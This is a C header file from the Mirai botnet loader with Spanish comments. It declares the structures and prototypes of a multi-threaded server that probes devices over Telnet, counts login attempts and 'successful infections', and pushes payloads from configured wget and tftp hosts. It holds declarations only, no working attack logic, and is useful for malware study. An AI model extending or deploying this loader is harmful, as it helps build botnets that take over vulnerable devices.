/**************************************************************************
 * Archivo: server.h
 * 
 * Descripción: Definición del servidor multi-hilo para el loader de Mirai.
 * Este módulo implementa:
 * - Servidor de escaneo y propagación
 * - Gestión de conexiones concurrentes
 * - Balanceo de carga entre hilos
 * - Monitoreo de recursos y estadísticas
 * 
 * El servidor utiliza epoll para manejo eficiente de E/S y soporta
 * múltiples métodos de carga de payload (wget, tftp, echo).
 **************************************************************************/

#pragma once

/***************************************************************************
 * Inclusión de cabeceras
 ***************************************************************************/
#include <sys/epoll.h>          /* API de E/S event-driven */
#include "includes.h"           /* Definiciones comunes */
#include "telnet_info.h"        /* Gestión de sesiones Telnet */
#include "connection.h"         /* Manejo de conexiones */

/**
 * Estructura principal del servidor
 * 
 * Esta estructura mantiene el estado global del servidor y sus recursos:
 * - Límites y contadores de conexiones
 * - Estadísticas de operación
 * - Configuración de hosts para carga
 * - Gestión de workers y conexiones
 */
struct server {
    uint32_t max_open;          /* Número máximo de conexiones permitidas */
    volatile uint32_t curr_open;/* Número actual de conexiones activas */
    
    /* Contadores atómicos para estadísticas */
    volatile uint32_t total_input;    /* Total de intentos de conexión */
    volatile uint32_t total_logins;   /* Total de intentos de login */
    volatile uint32_t total_echoes;   /* Total de cargas por echo */
    volatile uint32_t total_wgets;    /* Total de cargas por wget */
    volatile uint32_t total_tftps;    /* Total de cargas por tftp */
    volatile uint32_t total_successes;/* Total de infecciones exitosas */
    volatile uint32_t total_failures; /* Total de fallos de infección */
    
    /* Configuración de servidores de carga */
    char *wget_host_ip;         /* IP del servidor wget */
    char *tftp_host_ip;         /* IP del servidor tftp */
    port_t wget_host_port;      /* Puerto del servidor wget */
    
    /* Gestión de workers y conexiones */
    struct server_worker *workers;    /* Array de workers */
    struct connection **estab_conns; /* Conexiones establecidas */
    ipv4_t *bind_addrs;             /* IPs para binding */
    pthread_t to_thrd;              /* Thread de timeout */
    
    /* Contadores de recursos */
    uint8_t workers_len;       /* Número de workers */
    uint8_t bind_addrs_len;    /* Número de IPs de binding */
    int curr_worker_child;     /* Índice del worker actual */
};

/**
 * Estructura de un worker del servidor
 * 
 * Cada worker es un hilo independiente que maneja un conjunto
 * de conexiones usando su propio contexto epoll. Esto permite:
 * - Paralelismo real en sistemas multi-núcleo
 * - Aislamiento de eventos entre workers
 * - Mejor distribución de carga
 */
struct server_worker {
    struct server *srv;     /* Referencia al servidor principal */
    int efd;               /* Descriptor de epoll para este worker */
    pthread_t thread;      /* ID del hilo del worker */
    uint8_t thread_id;     /* Identificador único del worker */
};

/***************************************************************************
 * Prototipos de funciones públicas
 ***************************************************************************/

/**
 * Crea e inicializa una nueva instancia del servidor
 * 
 * @param threads   Número de workers a crear
 * @param addr_len  Número de direcciones IP para binding
 * @param addrs     Array de direcciones IP para binding
 * @param max_open  Máximo de conexiones simultáneas
 * @param wghip     IP del servidor wget
 * @param wghp      Puerto del servidor wget
 * @param thip      IP del servidor tftp
 * @return          Puntero al servidor o NULL si falla
 */
struct server *server_create(uint8_t threads, uint8_t addr_len, ipv4_t *addrs, 
                           uint32_t max_open, char *wghip, port_t wghp, char *thip);

/**
 * Destruye una instancia del servidor y libera recursos
 * 
 * @param srv  Servidor a destruir
 */
void server_destroy(struct server *srv);

/**
 * Encola una nueva conexión Telnet para procesamiento
 * 
 * @param srv   Servidor que manejará la conexión
 * @param info  Información de la conexión Telnet
 */
void server_queue_telnet(struct server *srv, struct telnet_info *info);

/**
 * Inicia un sondeo Telnet a un objetivo
 * 
 * @param srv   Servidor que realizará el sondeo
 * @param info  Información del objetivo a sondear
 */
void server_telnet_probe(struct server *srv, struct telnet_info *info);

/***************************************************************************
 * Prototipos de funciones internas
 ***************************************************************************/

/**
 * Vincula un hilo a un núcleo específico
 * @param core  Número de núcleo a usar
 */
static void bind_core(int core);

/**
 * Función principal de un worker
 * @param arg  Argumentos del worker (struct server_worker *)
 */
static void *worker(void *arg);

/**
 * Procesa los buffers de salida pendientes
 * @param wrker  Worker que procesa los buffers
 */
static void handle_output_buffers(struct server_worker *wrker);

/**
 * Maneja un evento de epoll
 * @param wrker  Worker que maneja el evento
 * @param ev     Evento a procesar
 */
static void handle_event(struct server_worker *wrker, struct epoll_event *ev);

/**
 * Hilo de timeout para limpiar conexiones inactivas
 * @param arg  Argumentos del hilo (struct server *)
 */
static void *timeout_thread(void *);
